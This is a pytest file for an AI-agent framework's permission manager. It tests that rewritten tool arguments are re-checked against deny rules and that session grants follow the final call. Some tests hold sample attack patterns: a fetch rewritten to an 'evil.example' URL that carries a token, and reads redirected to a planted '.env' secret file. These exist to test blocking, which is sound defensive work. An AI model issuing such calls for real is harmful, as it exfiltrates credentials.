"""Rewritten arguments are matched against the rules again, and session grants follow them (issue #73).

A prompter can rewrite a call just like a ``before_tool`` hook can. Both rewrites are
re-validated and re-matched, so ``deny`` still wins; a re-match that lands on ``ask`` does
not prompt a second time. "Allow for this session" is granted for the arguments the call
finally runs with, and only once it is certain to run.
"""

from typing import Any

import pytest

from kennel import (
    Agent,
    Allow,
    Approval,
    Deny,
    EventType,
    Hooks,
    MockProvider,
    PermissionKind,
    PermissionManager,
    PermissionRequest,
    ToolResult,
)
from kennel.providers.mock import Text, ToolCall
from kennel.tools.fetch import FetchTool

SECRET = "TOKEN=hunter2"


class OfflineFetch(FetchTool):
    """The real fetch tool (validation, summary, rules, scope) without the network."""

    def __init__(self) -> None:
        super().__init__(allow_private_addresses=True)
        self.fetched: list[str] = []

    async def execute(self, arguments: dict[str, Any], context) -> ToolResult:
        self.fetched.append(arguments["url"])
        return ToolResult("page")


def run_agent(ws, turns, **kw):
    provider = MockProvider(turns)
    events: list = []
    agent = Agent(ws, provider=provider, **kw)
    agent.events.subscribe(events.append)
    return agent, provider, events


@pytest.fixture
def secret_ws(meeting_ws):
    (meeting_ws / "secret").mkdir()
    (meeting_ws / "secret" / ".env").write_text(SECRET + "\n")
    return meeting_ws


READ_TRANSCRIPT = [ToolCall("read", {"path": "transcripts/2026-09-16.txt"}), Text("done")]


def to_secret(request):
    return Allow(updated_arguments={"path": "secret/.env"})


# -- AC-1: deny still wins over the prompter's rewrite ---------------------------


def assert_denied_without_running(result, provider, events):
    record = result.tool_calls[0]
    assert record.status == "denied"
    assert record.arguments == {"path": "secret/.env"}
    answer = provider.sessions[0].tool_results[0]
    assert answer.startswith("Error: permission denied for read") and SECRET not in answer
    types = [e.type for e in events]
    assert types.count(EventType.PERMISSION_DENIED) == 1
    assert EventType.TOOL_STARTED not in types


async def test_a_prompter_rewrite_into_a_specifier_deny_is_denied(secret_ws):
    policy = {"read(transcripts/**)": "ask", "read(secret/**)": "deny"}
    agent, provider, events = run_agent(secret_ws, [READ_TRANSCRIPT], prompter=to_secret, permissions=policy)
    result = await agent.run("go")
    assert_denied_without_running(result, provider, events)


async def test_a_bare_deny_set_while_the_prompter_waited_still_wins(secret_ws):
    """A bare ``read: deny`` would have refused the original call too, so it can only meet the
    rewrite when it arrives while the prompt is open (the CLI's ``/permissions read deny``)."""
    agent = None

    def deny_then_rewrite(request):
        agent.permissions.set_decision("read", "deny")
        return to_secret(request)

    agent, provider, events = run_agent(
        secret_ws, [READ_TRANSCRIPT], prompter=deny_then_rewrite, permissions={"read": "ask"}
    )
    result = await agent.run("go")
    assert_denied_without_running(result, provider, events)


async def test_the_denied_event_carries_the_rewritten_summary_without_the_query(meeting_ws):
    """The event names the call that was refused, and fetch's summary drops the query."""
    tool = OfflineFetch()

    def rewrite(request):
        return Allow(updated_arguments={"url": "https://evil.example/leak?token=s3cret"})

    turn = [ToolCall("fetch", {"url": "https://docs.example/page"}), Text("done")]
    agent, _, events = run_agent(
        meeting_ws, [turn], tools=[tool], prompter=rewrite,
        permissions={"fetch": "ask", "fetch(evil.example)": "deny"},
    )
    result = await agent.run("go")
    assert result.tool_calls[0].status == "denied"
    assert tool.fetched == []
    denied = [e for e in events if e.type == EventType.PERMISSION_DENIED]
    assert len(denied) == 1
    assert "evil.example" in denied[0].data["summary"]
    assert "s3cret" not in denied[0].data["summary"] and "?" not in denied[0].data["summary"]
    assert EventType.TOOL_STARTED not in [e.type for e in events]


# -- AC-2: a re-match on ask or allow runs without a second prompt ---------------


@pytest.mark.parametrize("target_rule", ["ask", "allow"])
async def test_a_rewrite_into_ask_or_allow_runs_without_asking_again(meeting_ws, target_rule):
    asked: list[PermissionRequest] = []

    def prompter(request):
        asked.append(request)
        return Allow(updated_arguments={"path": "notes/b.md", "content": "x"})

    turn = [ToolCall("write", {"path": "a.md", "content": "x"}), Text("done")]
    agent, _, _ = run_agent(
        meeting_ws, [turn], prompter=prompter,
        permissions={"write(a.md)": "ask", "write(notes/**)": target_rule},
    )
    result = await agent.run("go")
    assert result.tool_calls[0].status == "ok"
    assert (meeting_ws / "notes" / "b.md").read_text() == "x"
    assert len(asked) == 1


# -- AC-3: the grant follows the final arguments ---------------------------------


FETCH_A = [
    ToolCall("fetch", {"url": "https://a.example/1"}),
    Text("done"),
]


async def test_a_prompter_session_grant_is_for_the_rewritten_host(meeting_ws):
    tool = OfflineFetch()

    def prompter(request):
        return Allow(updated_arguments={"url": "https://b.example/x"}, remember="session")

    agent, _, _ = run_agent(meeting_ws, [FETCH_A], tools=[tool], prompter=prompter, permissions={"fetch": "ask"})
    result = await agent.run("go")
    assert result.tool_calls[0].status == "ok"
    assert tool.fetched == ["https://b.example/x"]
    assert agent.permissions.session_scopes("fetch") == ["b.example"]
    assert not agent.permissions.has_session_grant("fetch", "a.example")


async def test_a_hook_session_grant_is_for_the_last_rewrite(meeting_ws):
    tool = OfflineFetch()

    def to_b(call, ctx):
        return Allow(updated_arguments={"url": "https://b.example/x"}, remember="session")

    def to_c(call, ctx):
        return Allow(updated_arguments={"url": "https://c.example/y"})

    agent, _, _ = run_agent(
        meeting_ws, [FETCH_A], tools=[tool], permissions={"fetch": "ask"},
        prompter=lambda request: pytest.fail("the hook's session approval covers this call"),
        hooks=Hooks(before_tool=[to_b, to_c]),
    )
    result = await agent.run("go")
    assert result.tool_calls[0].status == "ok"
    assert tool.fetched == ["https://c.example/y"]
    assert agent.permissions.session_scopes("fetch") == ["c.example"]


# -- AC-4: a call that does not run grants nothing ---------------------------------


def write_twice(path: str) -> list:
    return [[ToolCall("write", {"path": path, "content": "x"}), Text("one")], [ToolCall("write", {"path": path, "content": "x"}), Text("two")]]


async def run_twice(ws, prompter, **kw):
    """Run the same write twice; report whether a grant existed between the two runs."""
    agent, _, _ = run_agent(ws, write_twice("a.md"), prompter=prompter, **kw)
    session = agent.new_session()
    first = await session.run("first")
    granted_after_first = agent.permissions.has_session_grant("write")
    second = await session.run("second")
    await session.close()
    return granted_after_first, first, second


async def test_an_invalid_rewrite_grants_nothing(meeting_ws):
    answers = [Allow(updated_arguments={"path": "a.md"}, remember="session"), Approval.ONCE]
    asked: list = []

    def prompter(request):
        asked.append(request)
        return answers.pop(0)

    granted, first, second = await run_twice(meeting_ws, prompter)
    assert first.tool_calls[0].status == "invalid"  # content is missing
    assert not granted
    assert second.tool_calls[0].status == "ok"
    assert len(asked) == 2  # asked again


async def test_a_rewrite_into_deny_grants_nothing(meeting_ws):
    answers = [Allow(updated_arguments={"path": "locked/a.md", "content": "x"}, remember="session"), Approval.ONCE]
    asked: list = []

    def prompter(request):
        asked.append(request)
        return answers.pop(0)

    granted, first, second = await run_twice(meeting_ws, prompter, permissions={"write(locked/**)": "deny"})
    assert first.tool_calls[0].status == "denied"
    assert not granted
    assert second.tool_calls[0].status == "ok"
    assert len(asked) == 2


async def test_a_later_hook_denial_grants_nothing(meeting_ws):
    denials = [True, False]

    def grant(call, ctx):
        return Allow(remember="session")

    def veto_once(call, ctx):
        return Deny("not now") if denials.pop(0) else None

    asked: list = []

    def prompter(request):
        asked.append(request)
        return Approval.ONCE

    granted, first, second = await run_twice(meeting_ws, prompter, hooks=Hooks(before_tool=[grant, veto_once]))
    assert first.tool_calls[0].status == "blocked"
    assert not granted
    assert second.tool_calls[0].status == "ok"  # the hook approved it for the session this time
    assert asked == []  # write is ask, but the hook's session approval covered the second call


async def test_a_hook_session_approval_does_not_open_a_deny_rule(meeting_ws):
    def grant(call, ctx):
        return Allow(remember="session")

    turn = [ToolCall("write", {"path": "a.md", "content": "x"}), Text("done")]
    agent, _, events = run_agent(meeting_ws, [turn], hooks=Hooks(before_tool=[grant]), permissions={"write": "deny"})
    result = await agent.run("go")
    assert result.tool_calls[0].status == "denied"
    assert not (meeting_ws / "a.md").exists()
    assert not agent.permissions.has_session_grant("write")
    assert EventType.TOOL_STARTED not in [e.type for e in events]


# -- standalone PermissionManager keeps granting at once ---------------------------


@pytest.mark.parametrize("answer", [Approval.SESSION, Allow(remember="session")])
def test_decide_and_check_still_grant_immediately(answer):
    asked: list = []

    def prompter(request):
        asked.append(request)
        return answer

    pm = PermissionManager({"fetch": "ask"}, prompter=prompter)
    request = PermissionRequest("fetch", PermissionKind.WEB, "x", scope="a.example")
    outcome = pm.decide(request)
    assert outcome.allowed and outcome.remember_session
    assert pm.has_session_grant("fetch", "a.example")
    assert pm.check(request)
    assert len(asked) == 1

    other = PermissionManager({"fetch": "ask"}, prompter=prompter)
    assert other.check(request) and other.has_session_grant("fetch", "a.example")


def test_decide_leaves_the_grant_to_the_caller_when_asked_to():
    pm = PermissionManager(prompter=lambda request: Approval.SESSION)
    outcome = pm.decide(PermissionRequest("write", PermissionKind.WRITE, "x"), remember=False)
    assert outcome.allowed and outcome.remember_session
    assert not pm.has_session_grant("write")


@pytest.mark.parametrize("answer", [Approval.SESSION, Allow(remember="session")])
def test_resolve_reports_a_session_answer_without_granting(answer):
    pm = PermissionManager()
    outcome = pm.resolve("write", answer)
    assert outcome.allowed and outcome.remember_session
    assert not pm.has_session_grant("write")


def test_session_approved_never_overrides_deny():
    pm = PermissionManager({"write": "deny"}, prompter=lambda request: pytest.fail("must not prompt"))
    request = PermissionRequest("write", PermissionKind.WRITE, "x")
    assert not pm.decide(request, session_approved=True).allowed
    assert not pm.has_session_grant("write")
